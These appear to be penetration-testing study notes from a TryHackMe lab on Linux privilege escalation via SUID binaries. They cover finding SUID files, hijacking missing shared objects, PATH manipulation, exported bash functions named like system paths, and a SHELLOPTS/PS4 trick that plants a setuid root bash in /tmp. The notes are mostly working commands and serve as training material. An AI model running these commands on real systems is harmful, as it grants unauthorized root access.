
### Dirty Search for SUID executables

```bash
find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null

find / -user root -perm -4000 -exec ls -ldb {} \;
```

### Compile SUID Bypass - Shared Object Injection

Reference the L_* section for specific C syntax. This
``` bash
strace /usr/local/bin/<thisiswherethepotentialvulnerablesharedobjectintect_SUIDexecutablegoes> 2>&1 | grep -iE "open|access|no such file"
```

Create the searched for application. Example from Tryhackme was `libcalc.c` in the `~/tools/suid/` directory. Compile a reverse shell or a local root shell if available.

### Environment Variable Abuse

SUID executables that don't specify the absolute path may be susceptible to exploitation

```bash
strings /usr/local/bin/<pathmisconfiguredSUIDexecutable>
```

The example explained states that the apache2 webserver start only calls **service** vs `/usrsbin/service`

so we compile a shell to be nasty/

```bash
gcc -o service /home/user/tools/suid/service.c

 ##then prepend the PATH variable to where the new compiled service is:

PATH=.:$PATH /usr/local/bin/suid-env
```

### Shell Abuse

_In Bash versions_ **_<4.2-048_** _it is possible to define shell functions with names that resemble file paths, then export those functions so that they are used instead of any actual executable at that file path._

```bash
function /usr/sbin/service { /bin/bash -p; }
export -f /usr/sbin/service
```

_Bash <4.4 can use debugging mode to establish a SUID version of_ `/bin/bash`

```bash
env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash)' /usr/local/bin/suid-env2

###Then run the shell created####
/tmp/rootbash -p
```